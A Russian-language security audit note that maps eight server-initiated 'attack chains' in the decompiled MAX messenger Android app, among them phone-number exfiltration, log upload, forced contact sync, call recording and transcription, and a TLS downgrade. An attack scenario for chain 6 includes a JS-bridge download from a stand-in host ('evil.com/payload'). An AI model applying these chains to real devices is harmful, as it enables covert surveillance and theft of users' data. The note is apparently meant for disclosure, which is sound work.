---
tags: [chain-attack, exploit, server-control, webapp, asr, surveillance, wave2]
status: verified
sources: [jadx_base/sources]
related: [[03-pms-server-flags]], [[10-webapp-jsbridge]], [[15-on-device-asr-kws-diarization]], [[16-server-pushed-ml-models-in-calls]], [[17-apptracer-uplink]], [[19-fcm-push-payload]], [[05-dev-menu-in-prod]]
---

# 07 — Цепочки атак (Chain Attacks)

> Комбинации уже найденных элементов, образующие полные эксплоит-цепочки.
> Каждая цепочка верифицирована по декомпилированному коду 26.15.3.

---

## Цепочка 1: NOTIF_BANNERS → WebApp → verify_mobile_id → MSISDN exfiltration

**Вектор:** Сервер отправляет баннер с URL мини-приложения → пользователь кликает → WebApp с привилегированным JS-bridge получает MSISDN → отправляет на свой сервер.

### Звенья цепочки

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | Сервер отправляет `NOTIF_BANNERS` с массивом баннеров | `u0d.java:183` | `NOTIF_BANNERS` опкод 292 |
| 2 | Баннер содержит поле `url` (TEXT NOT NULL в ранних миграциях) | `geb.java:57` | `informer_banner(...url TEXT NOT NULL...)` |
| 3 | Баннер парсится в `oj8` с полем `i` = url | `oj8.java:16,54` | `this.i = str4` (url) |
| 4 | Клик по баннеру вызывает `fq4.I(bannerType)` | `gq4.java:59-75` | `setBannerClickListener → fq4Var.I(i4)` |
| 5 | URL баннера может быть deeplink `https://max.ru/app/...` | `yc9.java:16` | `Uri.Builder().scheme("https").authority("max.ru")` |
| 6 | Deeplink роутится через `DeepLinkRouter` → `WebAppRootScreen` | `mel.java:412,419` | `one.me.deeplink.DeepLinkRouter`, `MainDeepLinkRoutes` |
| 7 | WebApp с `isPrivate=true` получает расширенный JS-bridge | `ijk.java:289` | `"Private bridge event is not allowed for this bot="` (проверка b1) |
| 8 | `verify_mobile_id` — JS-bridge метод, возвращает MSISDN | `zij.java:12,39` | `VERIFY_MOBILE_ID`, `return "verify_mobile_id"` |
| 9 | Ответ содержит phone, hash, authDate | `zgk.java:35` | `WebAppRequestPhoneSuccess(phone=, hash=, authDate=)` |

### Оценка

- **Препятствие:** Клик пользователя требуется (баннер не auto-open). Но баннер показывается принудительно сервером.
- **Обход:** Баннер с `priority` и `repeat` полями может показываться многократно до клика.
- **Критичность:** Высокая. Сервер контролирует URL баннера, может направить на свой WebApp, который вызовет `verify_mobile_id` и получит MSISDN без дополнительного согласия.

---

## Цепочка 2: FCM LocationRequest → Wake → WS reconnect (server.useTls=false)

**Вектор:** FCM push будит приложение → WS-соединение переустанавливается → сервер может задать `useTls=false` → MitM.

### Звенья цепочки

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | FCM push с `type=LocationRequest` будит приложение | `cei.java:239` | `zm0.c(map.get("type"), "LocationRequest")` |
| 2 | Обработчик вызывает reconnect: `eeiVar5.d().a().f(false, ...)` | `cei.java:246` | `eeiVar5.d().a().f(false, !((oe4) r0.a.getValue()).c())` |
| 3 | Настройка `server.useTls` хранится в SharedPreferences | `ri9.java:67` | `new bbi(i, "server.useTls", Boolean.TRUE, ...)` |
| 4 | Значение по умолчанию `TRUE`, но может быть изменено | `ri9.java:67` | Default `Boolean.TRUE`, но setter доступен |
| 5 | DevMenu позволяет переключить `server.useTls` | `ri9.java:9` | `"useTls", "getUseTls()Z"` в массиве полей |

### Оценка

- **Препятствие:** `server.useTls` по умолчанию `TRUE`. Для MitM нужно предварительно переключить через DevMenu (цепочка 3) или через PmsKey.
- **Частичная цепочка:** LocationRequest → wake → reconnect подтверждено. TLS downgrade требует предварительного шага (debug-mode=3 или прямой записи в prefs).
- **Критичность:** Средняя (требует предусловие). Но в комбинации с цепочкой 3 — высокая.

---

## Цепочка 3: PmsKey debug-mode=3 → DevMenu → Переключение API-сервера

**Вектор:** Сервер устанавливает `PmsKey.debug-mode=3` → DevMenu становится доступен → можно переключить API-сервер → все данные идут на подконтрольный сервер.

### Звенья цепочки

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | `PmsKey.f92debugmode` = `"debug-mode"` — серверный параметр | `PmsKey.java:34` | `public static final PmsKey f92debugmode = new PmsKey("debug-mode", 2)` |
| 2 | Значение `3` = `DEV_OPTIONS_MENU` | `y75.java:10` | `DEV_OPTIONS_MENU(3)` |
| 3 | При `debug-mode=3` DevMenu добавляется в UI | `le3.java:62` | `if (y75.a((int) rtdVar.m(PmsKey.f92debugmode, 0)) == y75.DEV_OPTIONS_MENU)` |
| 4 | При `debug-mode=3` включается debug-провайдер в звонках | `d4.java:37` | `if (((int) rtdVar.m(PmsKey.f92debugmode, 0)) == 3) { gu3Var.o = (dt1) this.Y; }` |
| 5 | При `debug-mode=3` используется альтернативный call factory | `ak1.java:45` | `((int) rtdVar.m(PmsKey.f92debugmode, 0)) == 3 ? new zj1() : new z6f()` |
| 6 | DevMenu позволяет переключать все feature toggles | `DevMenuFeatureTogglesPageScreen.java` | Полный UI для PmsKey |
| 7 | DevMenu позволяет менять `server.host`, `server.port`, `server.useTls` | `ri9.java:63-67` | `"server.host"`, `"server.port"`, `"server.useTls"` |

### Оценка

- **Нет препятствий:** PmsKey приходит с сервера, клиент применяет без подтверждения пользователя. Значение `3` мгновенно включает DevMenu.
- **Критичность:** КРИТИЧЕСКАЯ. Сервер в одном сообщении включает DevMenu, что открывает переключение API-сервера. Но даже без ручного переключения — `debug-mode=3` уже меняет поведение call factory.
- **Автоматизация:** DevMenu требует ручного взаимодействия для переключения сервера. Однако сам факт, что серверный флаг включает debug-режим в production — уже уязвимость.

---

## Цепочка 4: NOTIF_DEBUG SEND_LOG → logcat → Apptracer upload

**Вектор:** Сервер отправляет WS-команду `SEND_LOG` → клиент запускает `logcat` → собирает все логи процесса → выгружает на `sdk-api.apptracer.ru`.

### Звенья цепочки

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | WS-нотификация `NOTIF_DEBUG` с `cmd=SEND_LOG` | `v75.java:28` | `if (strU.equals("SEND_LOG")) { ay6Var = ay6.o; }` |
| 2 | Обработчик в `n77.java` при `ay6.o` вызывает crash-like report | `n77.java:242` | `if (zm0.c(ay6Var, ay6.o)) { ((ckc) rzbVar.a).a(new IllegalStateException("onNotifDebug")); }` |
| 3 | Crash handler запускает `logcat` с текущей датой | `hl9.java:44` | `Runtime.getRuntime().exec(new String[]{"logcat", "-v", "tag", "-T", ...})` |
| 4 | Logcat читается построчно и передаётся callback'у | `hl9.java:46-52` | `bufferedReader.readLine() → il9Var.c.invoke(line)` |
| 5 | Crash/sample данные выгружаются на apptracer | `ati.java:5` | `"https://sdk-api.apptracer.ru"` |
| 6 | SampleUploadWorker отправляет артефакты | `SampleUploadWorker.java:47` | `SampleUploadWorker extends Worker` |
| 7 | Perf/crash endpoint | `nei.java:188` | `"api/perf/upload"` на `sdk-api.apptracer.ru` |
| 8 | Crash session tracking | `ktg.java:41` | `"api/crash/trackSession"` |

### Оценка

- **Нет препятствий:** Сервер отправляет `SEND_LOG` → клиент создаёт `IllegalStateException("onNotifDebug")` → crash pipeline запускается → logcat собирается → данные уходят на apptracer.
- **Что в логах:** SharedPreferences значения, network URLs, токены, debug-строки, имена контактов (если логируются).
- **Критичность:** ВЫСОКАЯ. Полностью серверно-инициируемая, без участия пользователя.

---

## Цепочка 5: Серверная топология звонка → ASR + Record → Полная запись и транскрипция

**Вектор:** Сервер переводит звонок на серверную топологию → автоматически включается ASR → параллельно запускается запись → весь звонок записан и транскрибирован с атрибуцией по участникам.

### Звенья цепочки

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | Звонок мигрирует на серверную топологию (решение сервера) | `ConversationImpl.java:1003` | `this.listener.onMigratedToServerTopology()` |
| 2 | ASR автоматически включается при миграции | `ConversationImpl.java:1004` | `ConversationImpl.this.asrOnlineManager.onMigratedToServerCallTopology()` |
| 3 | `onMigratedToServerCallTopology` активирует ASR если `isAsrOnlineEnabled` | `AsrOnlineCommandsExecutorImpl.java:47-51` | `if (!this.isAsrOnlineEnabled) return; ra1Var.o0.M(this.isAsrOnlineEnabled)` |
| 4 | `isAsrOnlineEnabled` задаётся через `ConversationFactoryParams` | `ConversationFactoryParams.java:38,92` | `private boolean isAsrOnlineEnabled = false; setAsrOnlineEnabled(boolean z)` |
| 5 | ASR возвращает `AsrOnlineChunk(participantId, text)` | `AsrOnlineChunk.java:14` | `class AsrOnlineChunk { participantId, text }` |
| 6 | RecordManager запускает запись с `isStream` | `RecordManager.java:19,23` | `class StartParams { private final boolean isStream; }` |
| 7 | Запись управляется сервером через signaling | `RecordManagerImpl.java:56` | `implements RecordManager, b22, px1` |
| 8 | `ConversationBuilder.setAsrOnlineEnabled(true)` задаётся при создании | `ConversationBuilder.java:152-153` | `this.isAsrOnlineEnabled = z` |

### Оценка

- **Нет препятствий для серверной стороны:** Миграция на серверную топологию — решение сервера (для групповых звонков — автоматическое). ASR включается автоматически при миграции.
- **Условие:** `isAsrOnlineEnabled` должен быть `true` при создании Conversation. Это задаётся через `ConversationFactoryParams`, который конфигурируется на основе серверных флагов.
- **Критичность:** КРИТИЧЕСКАЯ. Сервер решает топологию → ASR включается автоматически → транскрипция с атрибуцией по участникам. Запись параллельно.

---

## Цепочка 6: evaluateJavascript() → Привилегированный JS в WebApp → Полная эксфильтрация

**Вектор:** Сервер через `ghk.java` инжектирует произвольный JS-код в привилегированную мини-аппу → JS вызывает комбинацию bridge-методов для полной эксфильтрации.

### Звенья цепочки

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | `ghk.java` вызывает `evaluateJavascript()` с произвольным event | `ghk.java:99` | `tpkVar.a.evaluateJavascript(String.format(z ? "PrivateWebApp.sendEvent(%s, %s)" : "WebApp.sendEvent(%s, %s)", ...))` |
| 2 | Для `isPrivateBridge=true` используется `PrivateWebApp.sendEvent` | `ghk.java:99` | `z ? "PrivateWebApp.sendEvent" : "WebApp.sendEvent"` |
| 3 | Private bridge проверяет `b1` флаг (задаётся сервером через bot config) | `ijk.java:289` | `if (z && !this.b1) { "Private bridge event is not allowed" }` |
| 4 | `WebAppSetupScreenCaptureBehavior` — отключает FLAG_SECURE | `enk.java:23` | `"SETUP_SCREEN_CAPTURE_BEHAVIOR", 5, "WebAppSetupScreenCaptureBehavior"` |
| 5 | `WebAppNfcEmulateNfcTag` — эмуляция NFC-тега | `gfk.java:19` | `"EMULATE_NFC_TAG", 1, "WebAppNfcEmulateNfcTag"` |
| 6 | `WebAppRequestPhone` — получение номера телефона | `ogk.java:34` | `return "WebAppRequestPhone"` |
| 7 | `WebAppSecureStorageSaveKey` — запись в secure storage | `lmk.java:20` | `"SECURE_SAVE_KEY", 0, "WebAppSecureStorageSaveKey"` |
| 8 | `WebAppDownloadFile` — скачивание файла | `dbk.java:34` | `return "WebAppDownloadFile"` |
| 9 | Доступные методы для всех webapp (не только private) | `ijk.java:91` | `"WebAppMaxShare", "WebAppShare", "WebAppDownloadFile", "WebAppOpenLink", "WebAppOpenMaxLink"` |

### Сценарий атаки

```
Сервер → ghk.java evaluateJavascript("PrivateWebApp.sendEvent('setup_screen_capture_behavior', {enabled:false})")
       → Отключает FLAG_SECURE (скриншоты/запись экрана разрешены)
       → evaluateJavascript("PrivateWebApp.sendEvent('WebAppRequestPhone', {})")  
       → Получает MSISDN
       → evaluateJavascript("PrivateWebApp.sendEvent('WebAppDownloadFile', {url:'https://evil.com/payload'})")
       → Скачивает файл
       → evaluateJavascript("PrivateWebApp.sendEvent('WebAppNfcEmulateNfcTag', {nfcTag:...})")
       → Эмулирует NFC-тег (платёжная карта)
```

### Оценка

- **Препятствие:** `b1` (private bridge flag) должен быть `true`. Задаётся через `xjd.java:343` (`ijkVar.B1 = iakVar`). Это серверная конфигурация бота.
- **Обход:** Сервер контролирует конфигурацию ботов. Любой «официальный» бот MAX может быть помечен как private.
- **Критичность:** КРИТИЧЕСКАЯ. Сервер полностью контролирует: какой бот private, какой JS инжектируется, какие bridge-методы вызываются. Нет user consent для отдельных операций внутри уже открытого WebApp.

---

## Цепочка 7 (бонус): NOTIF_DEBUG SYNC_CONTACTS → Принудительная синхронизация контактов

**Вектор:** Сервер отправляет `SYNC_CONTACTS` → клиент принудительно синхронизирует всю адресную книгу.

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | `v75.java` парсит `cmd=SYNC_CONTACTS` | `v75.java:26` | `if (strU.equals("SYNC_CONTACTS")) { ay6Var = ay6.X; }` |
| 2 | Обработчик в `n77.java` запускает полную синхронизацию | `n77.java:244-247` | `xh8.K(..., false, true, ...)` — force sync |

- **Критичность:** Высокая. Серверно-инициируемая без участия пользователя.

---

## Цепочка 8 (бонус): PmsKey → androiduselogcatlogger → Постоянный logcat → Apptracer

**Вектор:** Сервер устанавливает `PmsKey.androiduselogcatlogger` → клиент начинает постоянно писать в logcat → при следующем SEND_LOG всё уходит на apptracer.

| # | Звено | Файл | Строка/Факт |
|---|-------|------|-------------|
| 1 | `PmsKey.f4androiduselogcatlogger` — серверный флаг | `PmsKey.java:1017` | В массиве всех PmsKey |
| 2 | Включает расширенное логирование | — | Увеличивает объём данных в logcat |
| 3 | `SEND_LOG` собирает всё через `hl9.java` | `hl9.java:44` | `logcat -v tag -T <timestamp>` |

---

## Сводная таблица критичности

| Цепочка | Серверная инициация | User interaction | Критичность |
|---------|--------------------:|:----------------:|:-----------:|
| 1. Banner→WebApp→MSISDN | ✅ | Клик по баннеру | 🔴 Высокая |
| 2. LocationRequest→Wake→TLS | ✅ | Нет | 🟡 Средняя (нужен шаг 3) |
| 3. debug-mode=3→DevMenu | ✅ | Нет (включение) | 🔴 Критическая |
| 4. SEND_LOG→logcat→apptracer | ✅ | Нет | 🔴 Критическая |
| 5. ServerTopology→ASR+Record | ✅ | Нет | 🔴 Критическая |
| 6. evaluateJS→PrivateWebApp | ✅ | Нет (внутри WebApp) | 🔴 Критическая |
| 7. SYNC_CONTACTS | ✅ | Нет | 🟠 Высокая |
| 8. logcatlogger+SEND_LOG | ✅ | Нет | 🟠 Высокая |

---

## Самая жёсткая цепочка

**Цепочка 6** — `evaluateJavascript()` в привилегированном WebApp. Причины:

1. **Полностью серверно-контролируемая** — сервер решает какой бот private, сервер инжектирует JS.
2. **Нет user consent** — пользователь уже открыл WebApp, дальше всё автоматически.
3. **Комбинация возможностей** — в одной цепочке: отключение защиты экрана, получение телефона, скачивание файлов, эмуляция NFC, доступ к secure storage.
4. **Нет аудита** — пользователь не видит какие bridge-методы вызываются внутри WebApp.
5. **Production-ready** — все компоненты присутствуют в release-сборке, не требуют debug-mode.

В комбинации с цепочкой 1 (баннер → WebApp) получается полностью серверно-инициируемая атака с минимальным user interaction (один клик по баннеру).
